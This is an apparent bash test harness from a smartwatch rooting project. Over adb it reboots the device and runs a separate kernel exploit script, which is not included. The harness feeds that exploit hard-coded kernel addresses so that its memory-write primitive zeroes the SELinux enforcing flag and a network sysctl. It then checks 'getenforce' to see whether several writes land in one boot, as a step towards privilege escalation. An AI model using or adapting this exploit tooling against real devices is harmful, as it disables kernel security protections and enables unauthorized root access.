#!/usr/bin/env bash
# Does ONE boot land MORE THAN ONE rb_erase store?
# Two independent, harmless, shell-readable oracles are cleared in one program:
#   selinux_state.enforcing  @ 0xc1d5a720  -> oracle `getenforce`  (Permissive)
#   net.core.netdev_max_backlog @ 0xc1a08b1c -> oracle /proc/sys/net/core/...  (0)
# If BOTH move, multi-store programs per boot are possible, which means the
# read-channel and the escalation punch can live in the SAME boot.
#   bash dual_land.sh <label> [steps]
export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL='*'
ADB=/c/platform-tools/adb.exe
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
LABEL=${1:-dl1}
STEPS=${2:-8}
OUT="$ARCH/${LABEL}.txt"
: > "$OUT"
say() { echo "[$LABEL] $*" | tee -a "$OUT"; }
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-300} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 4; return 0; }
waitboot() { local m=${1:-360} w=0; while :; do b=$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r'); [ "$b" = "1" ] && break; sleep 4; w=$((w+4)); [ $w -ge $m ] && return 1; done; sleep 12; return 0; }

P=""
for i in $(seq 1 "$STEPS"); do
  if [ $((i % 2)) -eq 1 ]; then W=c1d5a720; else W=c1a08b1c; fi
  P="${P:+$P,}${W}=00000000"
done
say "program: $P"
waitdev || { say "NO-DEVICE"; exit 1; }
$ADB reboot >/dev/null 2>&1
say "rebooting ..."
waitdev 420 || { say "NO-DEVICE after reboot"; exit 1; }
waitboot || { say "BOOT-TIMEOUT"; exit 1; }
say "fresh boot: getenforce=$($ADB shell getenforce 2>/dev/null|tr -d '\r') backlog=$($ADB shell cat /proc/sys/net/core/netdev_max_backlog 2>/dev/null|tr -d '\r')"
timeout 300 $ADB shell "GHOSTLOCK_WS_TARGET=st GHOSTLOCK_ATTEMPTS=$STEPS GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAT_PLIST=$P sh /data/local/tmp/fire.sh" >/dev/null 2>&1
rc=$?
$ADB shell "cat /data/local/tmp/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/${LABEL}-fire.log"
grep -aE 'WS-DONE|STAT-STEP|exploit finished' "$ARCH/${LABEL}-fire.log" | tail -6 | tee -a "$OUT"
ge=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
bk=$($ADB shell cat /proc/sys/net/core/netdev_max_backlog 2>/dev/null | tr -d '\r')
say "RESULT rc=$rc getenforce=$ge backlog=$bk"
if [ "$ge" = "Permissive" ] && [ "$bk" = "0" ]; then
  say "*** TWO STORES LANDED IN ONE BOOT *** multi-store programs are viable"
  exit 0
fi
if [ "$ge" = "Permissive" ] || [ "$bk" = "0" ]; then
  say "one store landed only ($ge / $bk)"
  exit 2
fi
say "neither oracle moved"
exit 3
